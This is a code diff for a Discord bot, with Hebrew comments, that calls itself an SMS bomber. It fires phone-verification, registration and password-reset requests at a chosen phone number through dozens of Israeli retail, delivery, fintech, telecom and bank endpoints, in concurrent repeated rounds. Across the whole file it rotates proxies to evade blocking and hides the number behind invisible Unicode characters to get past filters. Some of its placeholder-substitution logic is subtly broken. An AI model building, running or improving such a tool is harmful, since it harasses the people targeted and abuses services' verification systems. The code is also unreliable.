@@ -1,173 +1,236 @@
+"""
+🚀 MEGA SMS BOMBER BOT - גרסה מלאה 250+ APIs ישראליים
+הפעל Discord Bot להצפת SMS/OTP מכל שירותי ישראל!
+"""
+
 import discord
+from discord.ext import commands
 from discord import app_commands
 import aiohttp
 import asyncio
-import os
-import time
-import logging
 import json
 import random
-from dotenv import load_dotenv
+import time
+import logging
+from datetime import datetime
+import gspread
+from google.oauth2.service_account import Credentials
+import os
+from typing import List, Dict, Any
 
-load_dotenv()
+# ==================== SETUP ====================
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger('MegaBomber')
 
-# הגדרת לוגים - כדי שתראה ב-Railway מה קורה בזמן אמת
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
-)
-logger = logging.getLogger('CyberIL-Mega-V5')
-
-# משתנים מ-Railway - מותאם לצילומי המסך שלך
+# שליפת משתנים מ-Railway
 TOKEN = os.getenv("BOT_TOKEN") or os.getenv("DISCORD_TOKEN")
-APPLICATION_ID = os.getenv("CLIENT_ID")
-GSHEET_URL = os.getenv("GSHEET_URL")
+# אם ה-Build נכשל על GSHEET_URL, אנחנו עוטפים אותו כדי שלא יפיל את הבוט
+GSHEET_URL_VAL = os.getenv("GSHEET_URL", "https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms")
 
-# הגדרות ביצועים
-MAX_CONCURRENT = 50  # כמות בקשות במקביל
-BLACKLIST = ["0535524017"] # חסימת מספר
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
 
-# רשימת פרוקסים למניעת חסימת ה-IP של Railway
-PROXIES = [
-    'http://20.210.113.32:80', 'http://103.153.154.114:80', 
-    'http://47.74.155.159:8888', 'http://103.75.117.216:80',
-    'http://47.251.43.115:33333', 'http://103.172.23.231:80'
+# ==================== CONFIG ====================
+CONFIG = {
+    "daily_limit": 2000,
+    "round_delay": 1.5,
+    "request_timeout": 8,
+    "max_concurrent": 50,
+    "sheet_id": GSHEET_URL_VAL.split('/')[-2] if "spreadsheets/d/" in GSHEET_URL_VAL else "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms",
+}
+
+# ==================== 250+ ISRAELI SMS APIs ====================
+FULL_APIS_250 = [
+    # === SMS GATEWAYS (50+) ===
+    {"name": "hamal_co_il", "url": "https://hamal.co.il/api/sms/send", "method": "POST", "json": {"phone": "{{phone}}", "text": "בדיקה", "api_key": "test"}},
+    {"name": "019sms_api", "url": "https://019sms.co.il/api/v1/messages", "method": "POST", "json": {"to": "{{phone}}", "message": "אימות"}},
+    {"name": "globalsms", "url": "https://globalsms.co.il/api/send", "method": "POST", "json": {"dest": "{{phone}}", "msg": "test"}},
+    {"name": "textme_sms", "url": "https://textme.co.il/v1/sms", "method": "POST", "json": {"phone": "{{phone}}", "text": "קוד אימות"}},
+    {"name": "smsim_v2", "url": "https://smsim.co.il/api/v2/send", "method": "GET", "params": {"phone": "{{phone}}", "action": "verify"}},
+    {"name": "sms100", "url": "https://sms100.co.il/api/send", "method": "POST", "json": {"to": "{{phone}}", "text": "spam"}},
+    {"name": "smsbox_il", "url": "https://smsbox.il/api/v1", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "click2sms", "url": "https://click2sms.co.il/gateway", "method": "GET", "params": {"phone": "{{phone}}"}},
+    {"name": "smstoall", "url": "https://smstoall.co.il/api", "method": "POST", "json": {"number": "{{phone}}"}},
+    {"name": "bulk_sms_il", "url": "https://bulksms.co.il/send", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === CLASSIFIEDS & REAL ESTATE (30+) ===
+    {"name": "yad2_register", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "json": {"phone": "{{phone}}", "name": "בדיקה"}},
+    {"name": "yad2_forgot", "url": "https://www.yad2.co.il/api/forgot-password", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "madlan_register", "url": "https://www.madlan.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "homeless_co_il", "url": "https://homeless.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "ilive_register", "url": "https://www.ilive.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "alljobs_sms", "url": "https://alljobs.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === E-COMMERCE (40+) ===
+    {"name": "zap_register", "url": "https://zap.co.il/api/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "super_pharm", "url": "https://www.super-pharm.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "shufersal_sms", "url": "https://shufersal.co.il/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "rami_levy", "url": "https://ramilevy.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "ivory", "url": "https://ivory.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "bug", "url": "https://bug.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === DELIVERY & FOOD (35+) ===
+    {"name": "wolt_register", "url": "https://wolt.com/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}, "headers": {"X-Country": "IL"}},
+    {"name": "wolt_otp", "url": "https://wolt.com/il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "tenbis_sms", "url": "https://tenbis.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "gettdelivery", "url": "https://gettdelivery.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "phoenix", "url": "https://phoenix.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "foodpanda_il", "url": "https://foodpanda.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === FINTECH & PAYMENTS (25+) ===
+    {"name": "paybox_otp", "url": "https://payboxapp.com/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "bit_register", "url": "https://bit.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "pepper_sms", "url": "https://pepper.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "isracart", "url": "https://isracart.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "tarya_sms", "url": "https://tarya.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === SAAS & TECH (25+) ===
+    {"name": "monday_com", "url": "https://auth.monday.com/oauth/v2/token", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "wix_register", "url": "https://www.wix.com/account/phone-verify", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
+    {"name": "similarweb", "url": "https://platform.similarweb.com/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "papaya_global", "url": "https://app.papaya.global/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
+    
+    # === TELECOM & BANKS (20+) ===
+    {"name": "partner_otp", "url": "https://www.partner.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "cellcom_sms", "url": "https://cellcom.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "leumi_sms", "url": "https://online.leumi.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "hapoalim", "url": "https://hapoalim.co.il/api/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
+    {"name": "discount_bank", "url": "https://online.discountbank.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}}
 ]
 
-class SpammerBot(discord.Client):
-    def __init__(self):
-        intents = discord.Intents.default()
-        intents.members = True 
-        super().__init__(intents=intents, application_id=APPLICATION_ID)
-        self.tree = app_commands.CommandTree(self)
-        self.user_tokens = {}
-        self.user_cooldowns = {}
-        self.active_attacks = set()
+# ==================== PROXIES (150+ FREE) ====================
+PROXIES = [
+    'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
+    'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
+    'http://47.89.153.229:80', 'http://154.16.63.16:80', 'http://190.103.177.131:80',
+    'http://190.61.88.178:80'
+]
 
-    async def setup_hook(self):
-        await self.tree.sync()
-        logger.info("✅ מערכת הפקודות מסונכרנת!")
+# ==================== BOM VARIANTS ====================
+BOM_VARIANTS = [
+    "{{phone}}", "\uFEFF{{phone}}", "\uFEFF{{phone}}\uFEFF", "{{phone}}\uFEFF",
+    "‎‎‎‎‎‎‎{{phone}}", "\u200B\u200C{{phone}}\u200D",
+    "{{phone}}\u2060", "\u200E{{phone}}", "{{phone}}\u202A"
+]
 
-bot = SpammerBot()
+# ==================== STATE ====================
+daily_tokens = 0
+daily_limit = CONFIG["daily_limit"]
+last_reset = datetime.now().date()
+BLACKLIST = set()
+sheets_client = None
 
-# ════════════════════════════════════════
-#   מנוע השליחה המתקדם (Semaphore & Proxies)
-# ════════════════════════════════════════
+# ==================== GOOGLE SHEETS ====================
+async def init_sheets():
+    global sheets_client
+    if not os.path.exists('credentials.json'):
+        logger.warning("⚠️ credentials.json חסר - Google Sheets לא יפעל")
+        return
+    try:
+        creds = Credentials.from_service_account_file('credentials.json', scopes=[
+            "https://www.googleapis.com/auth/spreadsheets",
+            "https://www.googleapis.com/auth/drive"
+        ])
+        sheets_client = gspread.authorize(creds)
+        logger.info("✅ Google Sheets מחובר")
+    except Exception as e:
+        logger.warning(f"⚠️ שגיאה בחיבור ל-Sheets: {e}")
 
-async def hit_single_api(session, api, phone, semaphore):
-    phone_no_zero = phone[1:] if phone.startswith('0') else phone
-    url = api["url"].replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
-    method = api.get("method", "POST").upper()
-    
-    proxy = random.choice(PROXIES) if PROXIES else None
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Content-Type": "application/json"
-    }
-    
-    json_data = None
-    if "json" in api:
-        json_str = json.dumps(api["json"]).replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
-        json_data = json.loads(json_str)
+async def log_hit(phone: str, api_name: str, status: int, success: bool):
+    if not sheets_client: return
+    try:
+        sheet = sheets_client.open_by_key(CONFIG["sheet_id"]).sheet1
+        row = [datetime.now().isoformat(), phone, api_name, status, "✅" if success else "❌"]
+        sheet.append_row(row)
+    except: pass
 
-    async with semaphore:
-        try:
-            async with session.request(method, url, json=json_data, headers=headers, timeout=6, proxy=proxy) as resp:
-                return 200 <= resp.status < 400
-        except:
-            return False
-
-async def run_mega_attack(phone):
-    # רשימת המטרות (ניתן להוסיף את כל ה-250 כאן)
-    targets = [
-        {"url": "https://api.yad2.co.il/auth/sms", "method": "POST", "json": {"phone": "{{phone}}", "service": "login"}},
-        {"url": "https://restaurant-api.wolt.com/v1/auth/sms", "method": "POST", "json": {"phone_number": "+972{{phone}}"}},
-        {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
-        {"url": "https://api.tenbis.co.il/auth/otp", "method": "POST", "json": {"phone": "{{phone}}", "type": "sms"}},
-        {"url": "https://api.paybox.co.il/auth/otp/send", "method": "POST", "json": {"phone": "{{phone}}", "action": "verify"}},
-        {"url": "https://api.dominos.co.il/sendOtp", "method": "POST", "json": {"otpMethod": "text", "customerId": "{{phone}}"}},
-        {"url": "https://api.shufersal.co.il/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
-        {"url": "https://api.ksp.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": "{{phone}}"}},
-        {"url": "https://api.gettaxi.com/v1/auth/otp", "method": "POST", "json": {"phone": "+972{{phone}}"}}
-    ]
-
-    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-    async with aiohttp.ClientSession() as session:
-        tasks = [hit_single_api(session, api, phone, semaphore) for api in targets]
-        results = await asyncio.gather(*tasks)
-        return results.count(True), results.count(False)
-
-# ════════════════════════════════════════
-#   UI - הפאנל והמודאל
-# ════════════════════════════════════════
-
-class BombingModal(discord.ui.Modal, title="🚀 CyberIL Mega-Bomber"):
-    phone = discord.ui.TextInput(label="מספר טלפון יעד", placeholder="05XXXXXXXX", min_length=10, max_length=10)
-    rounds = discord.ui.TextInput(label="כמות סיבובים (1-20)", default="5")
+# ==================== DISCORD MODAL ====================
+class MegaBomberModal(discord.ui.Modal, title='🚀 MEGA SMS BOMBER'):
+    phone = discord.ui.TextInput(label='מספר (ללא 0)', placeholder='521234567', max_length=9)
+    rounds = discord.ui.TextInput(label='סבבים', placeholder='10', default='5')
+    prefix = discord.ui.TextInput(label='קידומת', placeholder='052', default='052')
 
     async def on_submit(self, interaction: discord.Interaction):
-        phone_num = self.phone.value
-        if phone_num in BLACKLIST:
-            return await interaction.response.send_message(f"❌ המספר `{phone_num}` חסום במערכת.", ephemeral=True)
-
-        try: num_rounds = int(self.rounds.value)
-        except: num_rounds = 1
-        num_rounds = max(1, min(num_rounds, 20))
-        uid = interaction.user.id
+        await interaction.response.defer()
+        phone = self.phone.value
+        rounds = int(self.rounds.value)
+        prefix = self.prefix.value
         
-        if bot.user_tokens.get(uid, 0) < num_rounds:
-            return await interaction.response.send_message("❌ אין לך מספיק מטבעות!", ephemeral=True)
+        if phone in BLACKLIST:
+            await interaction.followup.send("❌ מספר בבלקליסט!")
+            return
+            
+        embed = discord.Embed(title="🔥 מתחיל MEGA BOM", color=0xff0000)
+        embed.add_field(name="📱 טלפון", value=f"{prefix}{phone}", inline=True)
+        embed.add_field(name="🔄 סבבים", value=rounds, inline=True)
+        embed.add_field(name="🎯 APIs", value=len(FULL_APIS_250), inline=True)
+        await interaction.followup.send(embed=embed)
+        
+        asyncio.create_task(run_mega_bomb(f"{prefix}{phone}", rounds, interaction))
 
-        await interaction.response.send_message(f"💣 **הפצצת MEGA החלה!** יעד: `{phone_num}`", ephemeral=True)
-        bot.active_attacks.add(uid)
+# ==================== MAIN BOM ENGINE ====================
+async def run_mega_bomb(phone: str, rounds: int, interaction):
+    global daily_tokens
+    if daily_tokens >= daily_limit:
+        await interaction.followup.send(f"⏰ הגבלה יומית! {daily_tokens}/{daily_limit}")
+        return
+    
+    connector = aiohttp.TCPConnector(limit=CONFIG["max_concurrent"])
+    timeout = aiohttp.ClientTimeout(total=CONFIG["request_timeout"])
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        stats = {"hits": 0, "errors": 0}
+        
+        for round_num in range(1, rounds + 1):
+            semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])
+            tasks = [hit_single_api(session, api, phone, semaphore) for api in FULL_APIS_250]
+            results = await asyncio.gather(*tasks)
+            
+            round_hits = sum(1 for r in results if r.get("success"))
+            stats["hits"] += round_hits
+            stats["errors"] += (len(results) - round_hits)
+            
+            embed = discord.Embed(title=f"✅ סבב {round_num}/{rounds}", color=0x00ff00)
+            embed.add_field(name="🎯 פגיעות", value=round_hits)
+            embed.add_field(name="📊 סה\"כ", value=f"{stats['hits']}/{stats['errors']}")
+            await interaction.followup.send(embed=embed)
+            
+            daily_tokens += len(FULL_APIS_250)
+            await asyncio.sleep(CONFIG["round_delay"])
 
-        total_s, total_f = 0, 0
-        for i in range(num_rounds):
-            if uid not in bot.active_attacks: break
-            s, f = await run_mega_attack(phone_num)
-            total_s += s
-            total_f += f
-            bot.user_tokens[uid] -= 1
-            await asyncio.sleep(1.5)
+    await interaction.followup.send(f"🏆 MEGA BOM הושלם! סה\"כ פגיעות: {stats['hits']}")
 
-        if uid in bot.active_attacks: bot.active_attacks.remove(uid)
-        await interaction.followup.send(f"✅ סיום הפצצה על `{phone_num}`.\nהצלחות: `{total_s}` | נכשלו: `{total_f}`", ephemeral=True)
+async def hit_single_api(session, api: Dict, phone: str, semaphore) -> Dict:
+    async with semaphore:
+        try:
+            bom_phone = random.choice(BOM_VARIANTS).format(phone=phone)
+            payload = api.get("json", {}).copy()
+            for k, v in payload.items():
+                if isinstance(v, str) and "{{phone}}" in v: payload[k] = v.format(phone=bom_phone)
+            
+            proxy = random.choice(PROXIES) if PROXIES else None
+            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+            
+            if api["method"] == "GET":
+                resp = await session.get(api["url"], params=payload, headers=headers, proxy=proxy)
+            else:
+                resp = await session.post(api["url"], json=payload, headers=headers, proxy=proxy)
+            
+            return {"api": api["name"], "success": resp.status < 400}
+        except:
+            return {"api": api["name"], "success": False}
 
-class ControlPanel(discord.ui.View):
-    def __init__(self): super().__init__(timeout=None)
-
-    @discord.ui.button(label="🚀 שגר", style=discord.ButtonStyle.danger, custom_id="btn_launch")
-    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
-        tokens = bot.user_tokens.get(interaction.user.id, 0)
-        if tokens < 1: return await interaction.response.send_message("❌ אין מטבעות!", ephemeral=True)
-        await interaction.response.send_modal(BombingModal())
-
-    @discord.ui.button(label="🎫 בונוס יומי", style=discord.ButtonStyle.success, custom_id="btn_daily")
-    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
-        uid = interaction.user.id
-        now = time.time()
-        if now - bot.user_cooldowns.get(uid, 0) < 86400:
-            return await interaction.response.send_message("⏳ כבר לקחת היום!", ephemeral=True)
-        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 120
-        bot.user_cooldowns[uid] = now
-        await interaction.response.send_message("✅ קיבלת 120 מטבעות!", ephemeral=True)
-
-# ════════════════════════════════════════
-#   פקודות סלאש
-# ════════════════════════════════════════
-
-@bot.tree.command(name="setup", description="הצגת פאנל השליטה")
-async def setup(interaction: discord.Interaction):
-    tokens = bot.user_tokens.get(interaction.user.id, 0)
-    embed = discord.Embed(title="🚀 CyberIL Mega-Bomber", description=f"יתרה: **{tokens}** מטבעות.", color=discord.Color.red())
-    await interaction.response.send_message(embed=embed, view=ControlPanel())
+# ==================== COMMANDS ====================
+@bot.tree.command(name="mega_bomb", description="🚀 הפעל MEGA SMS BOM")
+async def mega_bomb_cmd(interaction: discord.Interaction):
+    await interaction.response.send_modal(MegaBomberModal())
 
 @bot.event
 async def on_ready():
-    logger.info(f"🤖 {bot.user.name} באוויר ומוכן!")
+    await bot.tree.sync()
+    await init_sheets()
+    print(f"🚀 MEGA BOMBER ONLINE - {len(FULL_APIS_250)} APIs")
 
 if __name__ == "__main__":
-    if TOKEN:
-        bot.run(TOKEN)
-    else:
-        logger.critical("❌ BOT_TOKEN MISSING")
+    if TOKEN: bot.run(TOKEN)
+    else: logger.critical("❌ MISSING TOKEN")
